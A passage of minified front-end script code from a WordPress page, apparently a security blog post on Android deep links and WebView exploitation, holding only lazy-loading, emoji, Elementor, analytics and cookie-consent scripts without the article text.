_loadEverythingNow(){this.lastBreath=Date.now(),this._delayEventListeners(this),this._delayJQueryReady(this),this._handleDocumentWrite(),this._registerAllDelayedScripts(),this._preloadAllScripts(),await this._loadScriptsFromList(this.delayedScripts.normal),await this._loadScriptsFromList(this.delayedScripts.defer),await this._loadScriptsFromList(this.delayedScripts.async);try{await this._triggerDOMContentLoaded(),await this._triggerWindowLoad()}catch(t){console.error(t)}window.dispatchEvent(new Event("rocket-allScriptsLoaded")),this._waitForPendingClicks().then(()=>{this._replayClicks()}),this._emptyTrash()}_registerAllDelayedScripts(){document.querySelectorAll("script[type=rocketlazyloadscript]").forEach(t=>{t.hasAttribute("data-rocket-src")?t.hasAttribute("async")&&!1!==t.async?this.delayedScripts.async.push(t):t.hasAttribute("defer")&&!1!==t.defer||"module"===t.getAttribute("data-rocket-type")?this.delayedScripts.defer.push(t):this.delayedScripts.normal.push(t):this.delayedScripts.normal.push(t)})}async _transformScript(t){return new Promise((await this._littleBreath(),navigator.userAgent.indexOf("Firefox/")>0||""===navigator.vendor)?e=>{let r=document.createElement("script");[...t.attributes].forEach(t=>{let e=t.nodeName;"type"!==e&&("data-rocket-type"===e&&(e="type"),"data-rocket-src"===e&&(e="src"),r.setAttribute(e,t.nodeValue))}),t.text&&(r.text=t.text),r.hasAttribute("src")?(r.addEventListener("load",e),r.addEventListener("error",e)):(r.text=t.text,e());try{t.parentNode.replaceChild(r,t)}catch(i){e()}}:async e=>{function r(){t.setAttribute("data-rocket-status","failed"),e()}try{let i=t.getAttribute("data-rocket-type"),n=t.getAttribute("data-rocket-src");t.text,i?(t.type=i,t.removeAttribute("data-rocket-type")):t.removeAttribute("type"),t.addEventListener("load",function r(){t.setAttribute("data-rocket-status","executed"),e()}),t.addEventListener("error",r),n?(t.removeAttribute("data-rocket-src"),t.src=n):t.src="data:text/javascript;base64,"+window.btoa(unescape(encodeURIComponent(t.text)))}catch(s){r()}})}async _loadScriptsFromList(t){let e=t.shift();return e&&e.isConnected?(await this._transformScript(e),this._loadScriptsFromList(t)):Promise.resolve()}_preloadAllScripts(){this._batchInjectResourceHints([...this.delayedScripts.normal,...this.delayedScripts.defer,...this.delayedScripts.async],"preload")}_batchInjectResourceHints(t,e){var r=document.createDocumentFragment();t.forEach(t=>{let i=t.getAttribute&&t.getAttribute("data-rocket-src")||t.src;if(i){let n=document.createElement("link");n.href=i,n.rel=e,"preconnect"!==e&&(n.as="script"),t.getAttribute&&"module"===t.getAttribute("data-rocket-type")&&(n.crossOrigin=!0),t.crossOrigin&&(n.crossOrigin=t.crossOrigin),t.integrity&&(n.integrity=t.integrity),r.appendChild(n),this.trash.push(n)}}),document.head.appendChild(r)}_delayEventListeners(t){let e={};function r(t,r){!function t(r){!e[r]&&(e[r]={originalFunctions:{add:r.addEventListener,remove:r.removeEventListener},eventsToRewrite:[]},r.addEventListener=function(){arguments[0]=i(arguments[0]),e[r].originalFunctions.add.apply(r,arguments)},r.removeEventListener=function(){arguments[0]=i(arguments[0]),e[r].originalFunctions.remove.apply(r,arguments)});function i(t){return e[r].eventsToRewrite.indexOf(t)>=0?"rocket-"+t:t}}(t),e[t].eventsToRewrite.push(r)}function i(t,e){let r=t[e];Object.defineProperty(t,e,{get:()=>r||function(){},set(i){t["rocket"+e]=r=i}})}r(document,"DOMContentLoaded"),r(window,"DOMContentLoaded"),r(window,"load"),r(window,"pageshow"),r(document,"readystatechange"),i(document,"onreadystatechange"),i(window,"onload"),i(window,"onpageshow")}_delayJQueryReady(t){let e;function r(r){if(r&&r.fn&&!t.allJQueries.includes(r)){r.fn.ready=r.fn.init.prototype.ready=function(e){return t.domReadyFired?e.bind(document)(r):document.addEventListener("rocket-DOMContentLoaded",()=>e.bind(document)(r)),r([])};let i=r.fn.on;r.fn.on=r.fn.init.prototype.on=function(){if(this[0]===window){function t(t){return t.split(" ").map(t=>"load"===t||0===t.indexOf("load.")?"rocket-jquery-load":t).join(" ")}"string"==typeof arguments[0]||arguments[0]instanceof String?arguments[0]=t(arguments[0]):"object"==typeof arguments[0]&&Object.keys(arguments[0]).forEach(e=>{let r=arguments[0][e];delete arguments[0][e],arguments[0][t(e)]=r})}return i.apply(this,arguments),this},t.allJQueries.push(r)}e=r}r(window.jQuery),Object.defineProperty(window,"jQuery",{get:()=>e,set(t){r(t)}})}async _triggerDOMContentLoaded(){this.domReadyFired=!0,await this._littleBreath(),document.dispatchEvent(new Event("rocket-DOMContentLoaded")),await this._littleBreath(),window.dispatchEvent(new Event("rocket-DOMContentLoaded")),await this._littleBreath(),document.dispatchEvent(new Event("rocket-readystatechange")),await this._littleBreath(),document.rocketonreadystatechange&&document.rocketonreadystatechange()}async _triggerWindowLoad(){await this._littleBreath(),window.dispatchEvent(new Event("rocket-load")),await this._littleBreath(),window.rocketonload&&window.rocketonload(),await this._littleBreath(),this.allJQueries.forEach(t=>t(window).trigger("rocket-jquery-load")),await this._littleBreath();let t=new Event("rocket-pageshow");t.persisted=this.persisted,window.dispatchEvent(t),await this._littleBreath(),window.rocketonpageshow&&window.rocketonpageshow({persisted:this.persisted})}_handleDocumentWrite(){let t=new Map;document.write=document.writeln=function(e){let r=document.currentScript;r||console.error("WPRocket unable to document.write this: "+e);let i=document.createRange(),n=r.parentElement,s=t.get(r);void 0===s&&(s=r.nextSibling,t.set(r,s));let a=document.createDocumentFragment();i.setStart(a,0),a.appendChild(i.createContextualFragment(e)),n.insertBefore(a,s)}}async _littleBreath(){Date.now()-this.lastBreath>45&&(await this._requestAnimFrame(),this.lastBreath=Date.now())}async _requestAnimFrame(){return document.hidden?new Promise(t=>setTimeout(t)):new Promise(t=>requestAnimationFrame(t))}_emptyTrash(){this.trash.forEach(t=>t.remove())}static run(){let t=new RocketLazyLoadScripts;t._addUserInteractionListener(t)}}RocketLazyLoadScripts.run();</script><script type="rocketlazyloadscript">
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/8ksec.io\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.5.3"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
</script><script src="https://8ksec.io/wp-content/plugins/jquery-updater/js/jquery-3.7.1.min.js?ver=3.7.1" id="jquery-core-js" defer></script><script type="rocketlazyloadscript" data-rocket-type='text/javascript' data-rocket-src='https://8ksec.io/_jb_static/??-eJx9zkEOwiAQBdDbuBIIaWvjovEsQMc6BCgyUOLtpdGYGBOX8//Py9TIzBoyhCyiKwsGEvZeID1YibPKkIT9JB6X1CLW8Z5L7jFwS8f6C4AD324Mm5obEIt2aHbnu2Cv4j+yJqGIIJNwqMW1jZiqQKuHHdx6Rjf09H7m4ic5ykGeunE4H4ye5BMJHFI2' defer></script><script type="rocketlazyloadscript" class="hsq-set-content-id" data-content-id="blog-post">
        var _hsq = _hsq || [];
        _hsq.push(["setContentType", "blog-post"]);
</script><script type="application/javascript">const rocket_pairs = [{"selector":".rll-youtube-player .play","style":":root{--wpr-bg-4e19fb5d-5eeb-41f6-8a91-aafbad3346f1: url('https:\/\/8ksec.io\/wp-content\/plugins\/wp-rocket\/assets\/img\/youtube.png');}","hash":"4e19fb5d-5eeb-41f6-8a91-aafbad3346f1"},{"selector":".rll-youtube-player .play","style":":root{--wpr-bg-56049537-b1e7-4386-957e-f55c7494936b: url('https:\/\/8ksec.io\/wp-content\/plugins\/wp-rocket\/assets\/img\/youtube.png');}","hash":"56049537-b1e7-4386-957e-f55c7494936b"}];</script><script>class RocketElementorAnimation{constructor(){this.deviceMode=document.createElement("span"),this.deviceMode.id="elementor-device-mode-wpr",this.deviceMode.setAttribute("class","elementor-screen-only"),document.body.appendChild(this.deviceMode)}_detectAnimations(){let t=getComputedStyle(this.deviceMode,":after").content.replace(/"/g,"");this.animationSettingKeys=this._listAnimationSettingsKeys(t),document.querySelectorAll(".elementor-invisible[data-settings]").forEach(t=>{const e=t.getBoundingClientRect();if(e.bottom>=0&&e.top<=window.innerHeight)try{this._animateElement(t)}catch(t){}})}_animateElement(t){const e=JSON.parse(t.dataset.settings),i=e._animation_delay||e.animation_delay||0,n=e[this.animationSettingKeys.find(t=>e[t])];if("none"===n)return void t.classList.remove("elementor-invisible");t.classList.remove(n),this.currentAnimation&&t.classList.remove(this.currentAnimation),this.currentAnimation=n;let s=setTimeout(()=>{t.classList.remove("elementor-invisible"),t.classList.add("animated",n),this._removeAnimationSettings(t,e)},i);window.addEventListener("rocket-startLoading",function(){clearTimeout(s)})}_listAnimationSettingsKeys(t="mobile"){const e=[""];switch(t){case"mobile":e.unshift("_mobile");case"tablet":e.unshift("_tablet");case"desktop":e.unshift("_desktop")}const i=[];return["animation","_animation"].forEach(t=>{e.forEach(e=>{i.push(t+e)})}),i}_removeAnimationSettings(t,e){this._listAnimationSettingsKeys().forEach(t=>delete e[t]),t.dataset.settings=JSON.stringify(e)}static run(){const t=new RocketElementorAnimation;requestAnimationFrame(t._detectAnimations.bind(t))}}document.addEventListener("DOMContentLoaded",RocketElementorAnimation.run);</script><script type="application/javascript">const rocket_pairs = [{"selector":".rll-youtube-player .play","style":":root{--wpr-bg-4e19fb5d-5eeb-41f6-8a91-aafbad3346f1: url('https:\/\/8ksec.io\/wp-content\/plugins\/wp-rocket\/assets\/img\/youtube.png');}","hash":"4e19fb5d-5eeb-41f6-8a91-aafbad3346f1"},{"selector":".rll-youtube-player .play","style":":root{--wpr-bg-56049537-b1e7-4386-957e-f55c7494936b: url('https:\/\/8ksec.io\/wp-content\/plugins\/wp-rocket\/assets\/img\/youtube.png');}","hash":"56049537-b1e7-4386-957e-f55c7494936b"}];</script><script type="rocketlazyloadscript" defer id="bilmur" data-provider="wordpress.com" data-service="atomic"  data-rocket-src="https://s0.wp.com/wp-content/js/bilmur.min.js?m=202419"></script><script>window.addEventListener( 'load', function() {
        document.querySelectorAll( 'link' ).forEach( function( e ) {'not all' === e.media && e.dataset.media && ( e.media = e.dataset.media, delete e.dataset.media );} );
        var e = document.getElementById( 'jetpack-boost-critical-css' );
        e && ( e.media = 'not all' );
      } );</script><script id="leadin-script-loader-js-js-extra">
var leadin_wordpress = {"userRole":"visitor","pageType":"post","leadinPluginVersion":"11.1.6"};
</script><script type="rocketlazyloadscript" data-minify="1" data-rocket-src="https://8ksec.io/wp-content/cache/min/1/23795731.js?ver=1715117488" id="leadin-script-loader-js-js" defer></script><script type="rocketlazyloadscript" id="rocket-browser-checker-js-after">
"use strict";var _createClass=function(){function defineProperties(target,props){for(var i=0;i<props.length;i++){var descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,descriptor.key,descriptor)}}return function(Constructor,protoProps,staticProps){return protoProps&&defineProperties(Constructor.prototype,protoProps),staticProps&&defineProperties(Constructor,staticProps),Constructor}}();function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}var RocketBrowserCompatibilityChecker=function(){function RocketBrowserCompatibilityChecker(options){_classCallCheck(this,RocketBrowserCompatibilityChecker),this.passiveSupported=!1,this._checkPassiveOption(this),this.options=!!this.passiveSupported&&options}return _createClass(RocketBrowserCompatibilityChecker,[{key:"_checkPassiveOption",value:function(self){try{var options={get passive(){return!(self.passiveSupported=!0)}};window.addEventListener("test",null,options),window.removeEventListener("test",null,options)}catch(err){self.passiveSupported=!1}}},{key:"initRequestIdleCallback",value:function(){!1 in window&&(window.requestIdleCallback=function(cb){var start=Date.now();return setTimeout(function(){cb({didTimeout:!1,timeRemaining:function(){return Math.max(0,50-(Date.now()-start))}})},1)}),!1 in window&&(window.cancelIdleCallback=function(id){return clearTimeout(id)})}},{key:"isDataSaverModeOn",value:function(){return"connection"in navigator&&!0===navigator.connection.saveData}},{key:"supportsLinkPrefetch",value:function(){var elem=document.createElement("link");return elem.relList&&elem.relList.supports&&elem.relList.supports("prefetch")&&window.IntersectionObserver&&"isIntersecting"in IntersectionObserverEntry.prototype}},{key:"isSlowConnection",value:function(){return"connection"in navigator&&"effectiveType"in navigator.connection&&("2g"===navigator.connection.effectiveType||"slow-2g"===navigator.connection.effectiveType)}}]),RocketBrowserCompatibilityChecker}();
</script><script id="rocket-preload-links-js-extra">
var RocketPreloadLinksConfig = {"excludeUris":"\/(?:.+\/)?feed(?:\/(?:.+\/?)?)?$|\/(?:.+\/)?embed\/|\/(index.php\/)?(.*)wp-json(\/.*|$)|\/refer\/|\/go\/|\/recommend\/|\/recommends\/","usesTrailingSlash":"1","imageExt":"jpg|jpeg|gif|png|tiff|bmp|webp|avif|pdf|doc|docx|xls|xlsx|php","fileExt":"jpg|jpeg|gif|png|tiff|bmp|webp|avif|pdf|doc|docx|xls|xlsx|php|html|htm","siteUrl":"https:\/\/8ksec.io","onHoverDelay":"100","rateThrottle":"3"};
</script><script type="rocketlazyloadscript" id="rocket-preload-links-js-after">
(function() {
"use strict";var r="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},e=function(){function i(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(e,t,n){return t&&i(e.prototype,t),n&&i(e,n),e}}();function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}var t=function(){function n(e,t){i(this,n),this.browser=e,this.config=t,this.options=this.browser.options,this.prefetched=new Set,this.eventTime=null,this.threshold=1111,this.numOnHover=0}return e(n,[{key:"init",value:function(){!this.browser.supportsLinkPrefetch()||this.browser.isDataSaverModeOn()||this.browser.isSlowConnection()||(this.regex={excludeUris:RegExp(this.config.excludeUris,"i"),images:RegExp(".("+this.config.imageExt+")$","i"),fileExt:RegExp(".("+this.config.fileExt+")$","i")},this._initListeners(this))}},{key:"_initListeners",value:function(e){-1<this.config.onHoverDelay&&document.addEventListener("mouseover",e.listener.bind(e),e.listenerOptions),document.addEventListener("mousedown",e.listener.bind(e),e.listenerOptions),document.addEventListener("touchstart",e.listener.bind(e),e.listenerOptions)}},{key:"listener",value:function(e){var t=e.target.closest("a"),n=this._prepareUrl(t);if(null!==n)switch(e.type){case"mousedown":case"touchstart":this._addPrefetchLink(n);break;case"mouseover":this._earlyPrefetch(t,n,"mouseout")}}},{key:"_earlyPrefetch",value:function(t,e,n){var i=this,r=setTimeout(function(){if(r=null,0===i.numOnHover)setTimeout(function(){return i.numOnHover=0},1e3);else if(i.numOnHover>i.config.rateThrottle)return;i.numOnHover++,i._addPrefetchLink(e)},this.config.onHoverDelay);t.addEventListener(n,function e(){t.removeEventListener(n,e,{passive:!0}),null!==r&&(clearTimeout(r),r=null)},{passive:!0})}},{key:"_addPrefetchLink",value:function(i){return this.prefetched.add(i.href),new Promise(function(e,t){var n=document.createElement("link");n.rel="prefetch",n.href=i.href,n.onload=e,n.onerror=t,document.head.appendChild(n)}).catch(function(){})}},{key:"_prepareUrl",value:function(e){if(null===e||"object"!==(void 0===e?"undefined":r(e))||!1 in e||-1===["http:","https:"].indexOf(e.protocol))return null;var t=e.href.substring(0,this.config.siteUrl.length),n=this._getPathname(e.href,t),i={original:e.href,protocol:e.protocol,origin:t,pathname:n,href:t+n};return this._isLinkOk(i)?i:null}},{key:"_getPathname",value:function(e,t){var n=t?e.substring(this.config.siteUrl.length):e;return n.startsWith("/")||(n="/"+n),this._shouldAddTrailingSlash(n)?n+"/":n}},{key:"_shouldAddTrailingSlash",value:function(e){return this.config.usesTrailingSlash&&!e.endsWith("/")&&!this.regex.fileExt.test(e)}},{key:"_isLinkOk",value:function(e){return null!==e&&"object"===(void 0===e?"undefined":r(e))&&(!this.prefetched.has(e.href)&&e.origin===this.config.siteUrl&&-1===e.href.indexOf("?")&&-1===e.href.indexOf("#")&&!this.regex.excludeUris.test(e.href)&&!this.regex.images.test(e.href))}}],[{key:"run",value:function(){"undefined"!=typeof RocketPreloadLinksConfig&&new n(new RocketBrowserCompatibilityChecker({capture:!0,passive:!0}),RocketPreloadLinksConfig).init()}}]),n}();t.run();
}());
</script><script id="rocket_lazyload_css-js-extra">
var rocket_lazyload_css_data = {"threshold":"300"};
</script><script id="rocket_lazyload_css-js-after">
!function o(n,c,s){function i(t,e){if(!c[t]){if(!n[t]){var r="function"==typeof require&&require;if(!e&&r)return r(t,!0);if(u)return u(t,!0);throw(r=new Error("Cannot find module '"+t+"'")).code="MODULE_NOT_FOUND",r}r=c[t]={exports:{}},n[t][0].call(r.exports,function(e){return i(n[t][1][e]||e)},r,r.exports,o,n,c,s)}return c[t].exports}for(var u="function"==typeof require&&require,e=0;e<s.length;e++)i(s[e]);return i}({1:[function(e,t,r){"use strict";!function(){const r="undefined"==typeof rocket_pairs?[]:rocket_pairs,o=document.querySelector("#wpr-lazyload-bg");var e=rocket_lazyload_css_data.threshold||300;const n=new IntersectionObserver(e=>{e.forEach(t=>{if(t.isIntersecting){const e=r.filter(e=>t.target.matches(e.selector));e.map(t=>{t&&(o.innerHTML+=t.style,t.elements.forEach(e=>{n.unobserve(e),e.setAttribute("data-rocket-lazy-bg-".concat(t.hash),"loaded")}))})}})},{rootMargin:e+"px"});function t(){0<(0<arguments.length&&void 0!==arguments[0]?arguments[0]:[]).length&&r.forEach(t=>{try{const e=document.querySelectorAll(t.selector);e.forEach(e=>{"loaded"!==e.getAttribute("data-rocket-lazy-bg-".concat(t.hash))&&(n.observe(e),(t.elements||(t.elements=[])).push(e))})}catch(e){console.error(e)}})}t();const c=function(){const o=window.MutationObserver;return function(e,t){if(e&&1===e.nodeType){const r=new o(t);return r.observe(e,{attributes:!0,childList:!0,subtree:!0}),r}}}();e=document.querySelector("body"),c(e,t)}()},{}]},{},[1]);
</script><script type="rocketlazyloadscript" data-rocket-type='text/javascript' data-rocket-src='https://8ksec.io/wp-content/themes/hello-elementor/assets/js/hello-frontend.min.js?m=1713216896' defer></script><script id="happy-elementor-addons-js-extra">
var HappyLocalize = {"ajax_url":"https:\/\/8ksec.io\/wp-admin\/admin-ajax.php","nonce":"7aaa6c49f8","pdf_js_lib":"https:\/\/8ksec.io\/wp-content\/plugins\/happy-elementor-addons\/assets\/vendor\/pdfjs\/lib"};
</script><script type="rocketlazyloadscript" data-rocket-src="https://8ksec.io/wp-content/plugins/happy-elementor-addons/assets/js/happy-addons.min.js?ver=3.10.8" id="happy-elementor-addons-js" defer></script><script data-minify="1" src="https://8ksec.io/wp-content/cache/min/1/wp-content/plugins/elementskit-lite/libs/framework/assets/js/frontend-script.js?ver=1715117488" id="elementskit-framework-js-frontend-js" defer></script><script id="elementskit-framework-js-frontend-js-after">
    var elementskit = {
      resturl: 'https://8ksec.io/wp-json/elementskit/v1/',
    }
</script><script type="rocketlazyloadscript" data-rocket-type='text/javascript' data-rocket-src='https://8ksec.io/_jb_static/??-eJyVj80OgkAMhN/Gk9BsDBIPxGeB3UoK++e2mw1vLxKNXDxwmzb9ZqYlVjp4QS8QbR7JM6BFt848k1SWBKGQGVEYyJNAz/zWE3/WFetEUbie+Fz+moW0B3GIvZ7rlL2Qw9qRP0A/0nZkKhdMtshHcEsDlH6Jgdb/fmpnQV7bbHBLmp4Z0wKZQIf0rXl3nWpVo66Xtrmd9NCpF14Tenc=' defer></script><script id="elementor-frontend-js-before">
var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close","a11yCarouselWrapperAriaLabel":"Carousel | Horizontal scrolling: Arrow Left & Right","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}},"version":"3.21.5","is_static":false,"experimentalFeatures":{"e_optimized_assets_loading":true,"e_optimized_css_loading":true,"additional_custom_breakpoints":true,"container":true,"e_swiper_latest":true,"container_grid":true,"theme_builder_v2":true,"hello-theme-header-footer":true,"home_screen":true,"ai-layout":true,"landing-pages":true,"page-transitions":true,"notes":true,"form-submissions":true,"e_scroll_snap":true},"urls":{"assets":"https:\/\/8ksec.io\/wp-content\/plugins\/elementor\/assets\/"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"body_background_background":"classic","active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","hello_header_logo_type":"logo","hello_header_menu_layout":"horizontal","hello_footer_logo_type":"logo"},"post":{"id":7386,"title":"Android%20Deep%20Link%20issues%20and%20WebView%20Exploitation%20%7C%208kSec%20Blogs","excerpt":"","featuredImage":"https:\/\/i0.wp.com\/8ksec.io\/wp-content\/uploads\/2023\/04\/blog-deeplink.png?fit=800%2C800&ssl=1"}};
</script><script src="https://8ksec.io/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.21.5" id="elementor-frontend-js" defer></script><script type="rocketlazyloadscript" id="elementor-frontend-js-after">
var jkit_ajax_url = "https://8ksec.io/?jkit-ajax-request=jkit_elements", jkit_nonce = "57c32fba6a";
</script><script type="rocketlazyloadscript" data-minify="1" data-rocket-type='text/javascript' data-rocket-src='https://8ksec.io/wp-content/cache/min/1/wp-content/plugins/jeg-elementor-kit/assets/js/elements/sticky-element.js?ver=1715117488' defer></script><script type="text/plain" data-service="jetpack-statistics" data-category="statistics" data-cmplz-src="https://stats.wp.com/e-202419.js" id="jetpack-stats-js" data-wp-strategy="defer"></script><script id="jetpack-stats-js-after">
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"219667152\",\"post\":\"7386\",\"tz\":\"-4\",\"srv\":\"8ksec.io\",\"hp\":\"atomic\",\"ac\":\"2\",\"amp\":\"0\",\"j\":\"1:13.4\"}") ]);
_stq.push([ "clickTrackerInit", "219667152", "7386" ]);
</script><script id="cmplz-cookiebanner-js-extra">
var complianz = {"prefix":"cmplz_","user_banner_id":"1","set_cookies":[],"block_ajax_content":"","banner_version":"92","version":"7.0.5","store_consent":"","do_not_track_enabled":"1","consenttype":"optout","region":"us","geoip":"","dismiss_timeout":"","disable_cookiebanner":"","soft_cookiewall":"","dismiss_on_scroll":"","cookie_expiry":"365","url":"https:\/\/8ksec.io\/wp-json\/complianz\/v1\/","locale":"lang=en&locale=en_US","set_cookies_on_root":"","cookie_domain":"","current_policy_id":"11","cookie_path":"\/","categories":{"statistics":"statistics","marketing":"marketing"},"tcf_active":"","placeholdertext":"Click to accept {category} cookies and enable this content","css_file":"https:\/\/8ksec.io\/wp-content\/uploads\/complianz\/css\/banner-{banner_id}-{type}.css?v=92","page_links":{"us":{"cookie-statement":{"title":"Cookie Policy for 8kSec","url":"https:\/\/8ksec.io\/cookie-policy-for-8ksec\/"},"privacy-statement":{"title":"Privacy Policy","url":"https:\/\/8ksec.io\/privacy-policy\/"}}},"tm_categories":"","forceEnableStats":"","preview":"","clean_cookies":"","aria_label":"Click to accept {category} cookies and enable this content"};
</script><script defer src="https://8ksec.io/wp-content/plugins/complianz-gdpr/cookiebanner/js/complianz.min.js?ver=1714471607" id="cmplz-cookiebanner-js"></script><script type="rocketlazyloadscript" id="cmplz-cookiebanner-js-after">window.addEventListener('DOMContentLoaded', function() {
    if ('undefined' != typeof window.jQuery) {
      jQuery(document).ready(function ($) {
        $(document).on('elementor/popup/show', () => {
          let rev_cats = cmplz_categories.reverse();
          for (let key in rev_cats) {
            if (rev_cats.hasOwnProperty(key)) {
              let category = cmplz_categories[key];
              if (cmplz_has_consent(category)) {
                document.querySelectorAll('[data-category="' + category + '"]').forEach(obj => {
                  cmplz_remove_placeholder(obj);
                });
              }
            }
          }

          let services = cmplz_get_services_on_page();
          for (let key in services) {
            if (services.hasOwnProperty(key)) {
              let service = services[key].service;
              let category = services[key].category;
              if (cmplz_has_service_consent(service, category)) {
                document.querySelectorAll('[data-service="' + service + '"]').forEach(obj => {
                  cmplz_remove_placeholder(obj);
                });
              }
            }
          }
        });
      });
    }



      document.addEventListener("cmplz_enable_category", function(consentData) {
        var category = consentData.detail.category;
        var services = consentData.detail.services;
        var blockedContentContainers = [];
        let selectorVideo = '.cmplz-elementor-widget-video-playlist[data-category="'+category+'"],.elementor-widget-video[data-category="'+category+'"]';
        let selectorGeneric = '[data-cmplz-elementor-href][data-category="'+category+'"]';
        for (var skey in services) {
          if (services.hasOwnProperty(skey)) {
            let service = skey;
            selectorVideo +=',.cmplz-elementor-widget-video-playlist[data-service="'+service+'"],.elementor-widget-video[data-service="'+service+'"]';
            selectorGeneric +=',[data-cmplz-elementor-href][data-service="'+service+'"]';
          }
        }
        document.querySelectorAll(selectorVideo).forEach(obj => {
          let elementService = obj.getAttribute('data-service');
          if ( cmplz_is_service_denied(elementService) ) {
            return;
          }
          if (obj.classList.contains('cmplz-elementor-activated')) return;
          obj.classList.add('cmplz-elementor-activated');

          if ( obj.hasAttribute('data-cmplz_elementor_widget_type') ){
            let attr = obj.getAttribute('data-cmplz_elementor_widget_type');
            obj.classList.removeAttribute('data-cmplz_elementor_widget_type');
            obj.classList.setAttribute('data-widget_type', attr);
          }
          if (obj.classList.contains('cmplz-elementor-widget-video-playlist')) {
            obj.classList.remove('cmplz-elementor-widget-video-playlist');
            obj.classList.add('elementor-widget-video-playlist');
          }
